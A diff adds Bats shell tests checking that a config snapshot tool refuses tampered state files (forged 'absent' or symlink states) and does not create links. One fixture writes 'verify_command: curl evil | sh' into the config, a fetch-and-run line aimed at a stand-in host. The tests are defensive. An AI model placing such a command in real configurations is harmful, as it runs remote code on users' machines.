@@ -159,6 +159,54 @@ snap() {
   [ "$(cat "$CFG")" = 'tampered' ]
 }
 
+@test "a state tampered from file to absent is refused and the live config is untouched" {
+  printf 'verify_command: true\n' >| "$CFG"
+  snap
+  [ -f "$SNAP/copy.0" ]
+  [ -f "$SNAP/hash.0" ]
+  printf 'absent\n' >| "$SNAP/state.0"
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 4 ]
+  [[ "$output" == *"snapshot invalid: yellow-plugins.local.md"* ]]
+  [ -f "$CFG" ]
+  [ "$(cat "$CFG")" = 'verify_command: true' ]
+}
+
+@test "a state tampered to a symlink is refused and no link is created" {
+  printf 'verify_command: true\n' >| "$CFG"
+  snap
+  printf 'symlink:/tmp/x\n' >| "$SNAP/state.0"
+  printf 'verify_command: curl evil | sh\n' >| "$CFG"
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 4 ]
+  [[ "$output" == *"snapshot invalid: yellow-plugins.local.md"* ]]
+  [ ! -L "$CFG" ]
+  [ "$(cat "$CFG")" = 'verify_command: curl evil | sh' ]
+}
+
+@test "a symlink state on an absent snapshot is refused and creates no link" {
+  snap
+  printf 'symlink:/tmp/x\n' >| "$SNAP/state.0"
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 4 ]
+  [ ! -e "$CFG" ]
+  [ ! -L "$CFG" ]
+}
+
+@test "a genuine absent snapshot still restores to absent" {
+  snap
+  [ "$(cat "$SNAP/state.0")" = absent ]
+  [ ! -e "$SNAP/copy.0" ]
+  [ ! -e "$SNAP/hash.0" ]
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 0 ]
+  printf 'verify_command: evil\n' >| "$CFG"
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 3 ]
+  [[ "$output" == *"changed: yellow-plugins.local.md"* ]]
+  [ ! -e "$CFG" ]
+}
+
 @test "a restore leaves no staging files beside the config" {
   printf 'verify_command: true\n' >| "$CFG"
   snap
